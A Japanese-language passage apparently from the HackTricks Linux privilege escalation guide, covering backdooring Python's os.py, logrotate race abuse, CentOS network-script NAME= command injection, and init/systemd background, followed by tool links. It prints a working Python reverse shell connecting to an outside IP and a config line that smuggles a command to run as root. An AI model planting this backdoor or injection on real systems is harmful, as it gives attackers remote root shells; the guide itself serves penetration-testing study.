Pythonスクリプトがどこから実行されるかを知っていて、そのフォルダ内に**書き込むことができる**、または**Pythonライブラリを変更できる**場合、OSライブラリを変更してバックドアを仕掛けることができます（Pythonスクリプトが実行される場所に書き込むことができる場合は、os.pyライブラリをコピーして貼り付けます）。

ライブラリに**バックドアを仕掛ける**には、os.pyライブラリの最後に次の行を追加します（IPとPORTを変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotateの悪用

`logrotate`には、**ログファイル**またはその**親ディレクトリ**のいずれかに**書き込み権限を持つユーザー**が、任意の場所にファイルを書き込むことを可能にする脆弱性があります。**logrotate**が**root**として実行されている場合、ユーザーはログインする任意のユーザーによって実行される _**/etc/bash\_completion.d/**_ にファイルを書き込むことができます。\
したがって、**ログファイル**またはその**親フォルダー**に**書き込み権限**がある場合、**privesc**が可能です（ほとんどのLinuxディストリビューションでは、logrotateは毎日一度**rootユーザー**として自動的に実行されます）。また、_/var/log_以外にも**ローテート**されているファイルがないか確認してください。

{% hint style="info" %}
この脆弱性は`logrotate`バージョン`3.18.0`およびそれ以前に影響します
{% endhint %}

この脆弱性に関する詳細情報は、次のページで見つけることができます：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は[**logrotten**](https://github.com/whotwagner/logrotten)を使って悪用することができます。

この脆弱性は[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginxのログ)** と非常に似ているので、ログを変更できることがわかったら、それらのログを管理している人を確認し、ログをシンボリックリンクに置き換えることで権限昇格ができるかどうかを確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

何らかの理由でユーザーが _/etc/sysconfig/network-scripts_ に`ifcf-<何か>`スクリプトを**書き込む**ことができる**か**、既存のものを**調整**することができる場合、その**システムはpwnedです**。

ネットワークスクリプト、例えば_ifcg-eth0_はネットワーク接続に使用されます。これらは.INIファイルのように見えますが、LinuxではNetwork Manager (dispatcher.d)によって\~sourced\~されます。

私の場合、これらのネットワークスクリプトの`NAME=`属性は正しく扱われていません。**名前に空白/スペースがあると、システムはその後の部分を実行しようとします**。つまり、**最初の空白の後のすべてがrootとして実行されます**。

例： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
```
**脆弱性参照:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init、init.d、systemd、および rc.d**

`/etc/init.d` には System V init ツール (SysVinit) によって使用される **スクリプト** が含まれています。これは **Linux の伝統的なサービス管理パッケージ** で、カーネルの初期化が完了した後に実行される最初のプロセスである `init` プログラムと、サービスの開始と停止、設定の管理のためのインフラストラクチャが含まれています。具体的には、`/etc/init.d` のファイルは `start`、`stop`、`restart`、および (サポートされている場合) `reload` コマンドに応答するシェルスクリプトで、特定のサービスを管理します。これらのスクリプトは直接呼び出されるか、（通常は）他のトリガー（通常は `/etc/rc?.d/` にあるシンボリックリンクの存在）を介して呼び出されます。 (こちらから [https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d))。このフォルダの他の代替案は Redhat の `/etc/rc.d/init.d` です。

`/etc/init` には **Upstart** によって使用される **設定** ファイルが含まれています。Upstart は Ubuntu が推進する若い **サービス管理パッケージ** です。`/etc/init` のファイルは、サービスの `start`、`stop`、設定の `reload`、またはサービスの `status` を問い合わせる方法とタイミングを Upstart に指示する設定ファイルです。lucid 以降、Ubuntu は SysVinit から Upstart への移行を進めており、多くのサービスが Upstart の設定ファイルが優先されるにもかかわらず SysVinit スクリプトを持っている理由を説明しています。SysVinit スクリプトは Upstart の互換性レイヤーによって処理されます。 (こちらから [https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d))。

**systemd** は **デーモンのオンデマンド起動**、マウントおよび自動マウントポイントの維持、スナップショットサポート、および Linux コントロールグループを使用したプロセス追跡などの機能を含む **Linux 初期化システムおよびサービスマネージャー** です。systemd はログデーモンおよび一般的なシステム管理タスクを支援する他のツールやユーティリティを提供します。 (こちらから [https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/))。

ディストリビューションリポジトリからダウンロードされたパッケージに含まれるファイルは `/usr/lib/systemd/` に入ります。システム管理者（ユーザー）による変更は `/etc/systemd/system/` に入ります。

## その他のテクニック

### NFS 権限昇格

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no_root_squash-misconfiguration-pe.md](nfs-no_root_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### 制限されたシェルからの脱出

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## カーネルセキュリティ保護

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## さらなるヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc ツール

### **Linux ローカル権限昇格ベクトルを探すための最良のツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t オプション)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC のカーネル脆弱性を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**さらなるスクリプトのまとめ**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考文献

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><strong>AWS ハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見してください。私たちの独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションです。
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**telegram グループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) で**フォローしてください。**
* **HackTricks** の [**GitHub リポジトリ**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) に PR を提出して、あなたのハッキングテクニックを共有してください。

</details>
```
